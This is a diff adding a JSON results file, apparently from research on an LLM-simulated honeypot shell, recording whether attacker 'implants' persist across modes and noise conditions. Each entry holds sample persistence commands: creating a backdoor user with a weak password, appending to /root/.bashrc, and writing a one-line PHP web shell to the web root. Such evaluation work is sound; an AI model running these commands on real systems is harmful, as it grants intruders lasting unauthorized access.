@@ -1,0 +1,200 @@
+[
+  {
+    "mode": "ORIGINAL",
+    "scenario_id": "HC-T1136-001",
+    "noise_condition": "Ideal",
+    "success": true,
+    "latency_ms": 2369.6203231811523,
+    "context_tokens": 18,
+    "noise_tokens": 0,
+    "implant_response": "root@honeypot:~# useradd -m -s /bin/bash sysupdate && echo 'sysupdate:pass' | chpasswd\nroot@honeypot:~#",
+    "verify_response": "uid=1001(sysupdate) gid=1001(sysupdate) groups=1001(sysupdate)"
+  },
+  {
+    "mode": "ORIGINAL",
+    "scenario_id": "HC-T1546-004",
+    "noise_condition": "Ideal",
+    "success": true,
+    "latency_ms": 2173.4206676483154,
+    "context_tokens": 13,
+    "noise_tokens": 0,
+    "implant_response": "root@honeypot:~# echo 'export EVIL=backdoor' >> /root/.bashrc\nroot@honeypot:~#",
+    "verify_response": "export EVIL=backdoor"
+  },
+  {
+    "mode": "ORIGINAL",
+    "scenario_id": "HC-T1505-003",
+    "noise_condition": "Ideal",
+    "success": true,
+    "latency_ms": 2382.657527923584,
+    "context_tokens": 14,
+    "noise_tokens": 0,
+    "implant_response": "root@honeypot:~# echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php\nroot@honeypot:~#",
+    "verify_response": "<?php system($_GET[cmd]); ?>"
+  },
+  {
+    "mode": "RAW_HISTORY",
+    "scenario_id": "HC-T1136-001",
+    "noise_condition": "Ideal",
+    "success": true,
+    "latency_ms": 2351.722002029419,
+    "context_tokens": 25,
+    "noise_tokens": 0,
+    "implant_response": "root@honeypot:~# useradd -m -s /bin/bash sysupdate && echo 'sysupdate:pass' | chpasswd\nroot@honeypot:~#",
+    "verify_response": "uid=1000(sysupdate) gid=1000(sysupdate) groups=1000(sysupdate)"
+  },
+  {
+    "mode": "RAW_HISTORY",
+    "scenario_id": "HC-T1546-004",
+    "noise_condition": "Ideal",
+    "success": true,
+    "latency_ms": 2686.1157417297363,
+    "context_tokens": 15,
+    "noise_tokens": 0,
+    "implant_response": "root@honeypot:~# echo 'export EVIL=backdoor' >> /root/.bashrc\nroot@honeypot:~#",
+    "verify_response": "export EVIL=backdoor\nroot@honeypot:~#"
+  },
+  {
+    "mode": "RAW_HISTORY",
+    "scenario_id": "HC-T1505-003",
+    "noise_condition": "Ideal",
+    "success": true,
+    "latency_ms": 2548.1786727905273,
+    "context_tokens": 17,
+    "noise_tokens": 0,
+    "implant_response": "root@honeypot:~# echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php\nroot@honeypot:~#",
+    "verify_response": "<?php system($_GET[cmd]); ?>\nroot@honeypot:~#"
+  },
+  {
+    "mode": "ORIGINAL",
+    "scenario_id": "HC-T1136-001",
+    "noise_condition": "Noise-100",
+    "success": true,
+    "latency_ms": 2406.4781665802,
+    "context_tokens": 18,
+    "noise_tokens": 0,
+    "implant_response": "root@honeypot:~# useradd -m -s /bin/bash sysupdate && echo 'sysupdate:pass' | chpasswd\nroot@honeypot:~#",
+    "verify_response": "uid=1001(sysupdate) gid=1001(sysupdate) groups=1001(sysupdate)"
+  },
+  {
+    "mode": "ORIGINAL",
+    "scenario_id": "HC-T1546-004",
+    "noise_condition": "Noise-100",
+    "success": true,
+    "latency_ms": 1965.4326438903809,
+    "context_tokens": 13,
+    "noise_tokens": 0,
+    "implant_response": "root@honeypot:~# echo 'export EVIL=backdoor' >> /root/.bashrc\nroot@honeypot:~#",
+    "verify_response": "export EVIL=backdoor"
+  },
+  {
+    "mode": "ORIGINAL",
+    "scenario_id": "HC-T1505-003",
+    "noise_condition": "Noise-100",
+    "success": true,
+    "latency_ms": 2165.5564308166504,
+    "context_tokens": 14,
+    "noise_tokens": 0,
+    "implant_response": "root@honeypot:~# echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php\nroot@honeypot:~#",
+    "verify_response": "<?php system($_GET[cmd]); ?>"
+  },
+  {
+    "mode": "RAW_HISTORY",
+    "scenario_id": "HC-T1136-001",
+    "noise_condition": "Noise-100",
+    "success": true,
+    "latency_ms": 2548.7992763519287,
+    "context_tokens": 861,
+    "noise_tokens": 1240,
+    "implant_response": "root@honeypot:~# useradd -m -s /bin/bash sysupdate && echo 'sysupdate:pass' | chpasswd\nroot@honeypot:~#",
+    "verify_response": "uid=1001(sysupdate) gid=1001(sysupdate) groups=1001(sysupdate)"
+  },
+  {
+    "mode": "RAW_HISTORY",
+    "scenario_id": "HC-T1546-004",
+    "noise_condition": "Noise-100",
+    "success": true,
+    "latency_ms": 2723.383665084839,
+    "context_tokens": 835,
+    "noise_tokens": 1230,
+    "implant_response": "root@honeypot:~# echo 'export EVIL=backdoor' >> /root/.bashrc\nroot@honeypot:~#",
+    "verify_response": "export EVIL=backdoor\nroot@honeypot:~#"
+  },
+  {
+    "mode": "RAW_HISTORY",
+    "scenario_id": "HC-T1505-003",
+    "noise_condition": "Noise-100",
+    "success": true,
+    "latency_ms": 2049.5498180389404,
+    "context_tokens": 826,
+    "noise_tokens": 1226,
+    "implant_response": "root@honeypot:~# echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php\nroot@honeypot:~#",
+    "verify_response": "<?php system($_GET[cmd]); ?>"
+  },
+  {
+    "mode": "ORIGINAL",
+    "scenario_id": "HC-T1136-001",
+    "noise_condition": "Sandwich-100",
+    "success": true,
+    "latency_ms": 2603.5749912261963,
+    "context_tokens": 18,
+    "noise_tokens": 0,
+    "implant_response": "root@honeypot:~# useradd -m -s /bin/bash sysupdate && echo 'sysupdate:pass' | chpasswd\nroot@honeypot:~#",
+    "verify_response": "uid=1001(sysupdate) gid=1001(sysupdate) groups=1001(sysupdate)"
+  },
+  {
+    "mode": "ORIGINAL",
+    "scenario_id": "HC-T1546-004",
+    "noise_condition": "Sandwich-100",
+    "success": true,
+    "latency_ms": 2413.8221740722656,
+    "context_tokens": 13,
+    "noise_tokens": 0,
+    "implant_response": "root@honeypot:~# echo 'export EVIL=backdoor' >> /root/.bashrc\nroot@honeypot:~#",
+    "verify_response": "export EVIL=backdoor"
+  },
+  {
+    "mode": "ORIGINAL",
+    "scenario_id": "HC-T1505-003",
+    "noise_condition": "Sandwich-100",
+    "success": true,
+    "latency_ms": 2311.199903488159,
+    "context_tokens": 14,
+    "noise_tokens": 0,
+    "implant_response": "root@honeypot:~# echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php\nroot@honeypot:~#",
+    "verify_response": "<?php system($_GET[cmd]); ?>"
+  },
+  {
+    "mode": "RAW_HISTORY",
+    "scenario_id": "HC-T1136-001",
+    "noise_condition": "Sandwich-100",
+    "success": true,
+    "latency_ms": 2561.2075328826904,
+    "context_tokens": 862,
+    "noise_tokens": 1240,
+    "implant_response": "root@honeypot:~# useradd -m -s /bin/bash sysupdate && echo 'sysupdate:pass' | chpasswd\nroot@honeypot:~#",
+    "verify_response": "uid=1001(sysupdate) gid=1001(sysupdate) groups=1001(sysupdate)"
+  },
+  {
+    "mode": "RAW_HISTORY",
+    "scenario_id": "HC-T1546-004",
+    "noise_condition": "Sandwich-100",
+    "success": true,
+    "latency_ms": 2201.071262359619,
+    "context_tokens": 811,
+    "noise_tokens": 1216,
+    "implant_response": "root@honeypot:~# echo 'export EVIL=backdoor' >> /root/.bashrc\nroot@honeypot:~#",
+    "verify_response": "export EVIL=backdoor\nroot@honeypot:~#"
+  },
+  {
+    "mode": "RAW_HISTORY",
+    "scenario_id": "HC-T1505-003",
+    "noise_condition": "Sandwich-100",
+    "success": true,
+    "latency_ms": 2207.244396209717,
+    "context_tokens": 852,
+    "noise_tokens": 1237,
+    "implant_response": "root@honeypot:~# echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php\nroot@honeypot:~#",
+    "verify_response": "<?php system($_GET[cmd]); ?>"
+  }
+]
